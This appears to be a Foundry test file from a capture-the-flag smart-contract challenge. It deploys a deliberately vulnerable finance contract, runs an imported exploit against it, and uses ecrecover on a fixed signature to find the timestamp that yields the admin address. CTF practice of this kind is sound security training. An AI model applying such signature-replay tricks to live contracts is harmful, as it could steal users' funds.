// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./challenge/GOATFinance.sol";
import "./Exploit.sol";

contract ExploitTest is Test {
    function test() public {
        address playerAddress = makeAddr("player");
        PrivilegeFinance finance = new PrivilegeFinance();
        vm.deal(playerAddress, 1 ether);

        vm.startPrank(playerAddress, playerAddress);
        Exploit exploit = new Exploit();
        exploit.exploit(address(finance));
        finance.setflag();
        vm.stopPrank();

        assertTrue(finance.isSolved(), "Invalid Instance");
    }

    function test2() public {
        uint256 time = 1677729607;
        emit log_address(calcAdmin(0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E053, time + 1));
        emit log_address(calcAdmin(0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E053, time + 2)); // correct
    }

    function calcAdmin(address msgsender, uint256 blockTimestamp) public returns (address addr) {
        bytes32 r = 0xf296e6b417ce70a933383191bea6018cb24fa79d22f7fb3364ee4f54010a472c;
        bytes32 s = 0x62bdb7aed9e2f82b2822ab41eb03e86a9536fcccff5ef6c1fbf1f6415bd872f9;
        uint8 v = 28;
        address admin = 0x2922F8CE662ffbD46e8AE872C1F285cd4a23765b;
        uint256 rewmax = 65000000000000000000000;

        bytes32 hash_ = keccak256(abi.encodePacked(msgsender, rewmax, blockTimestamp));
        addr = ecrecover(hash_, v, r, s);
    }
}
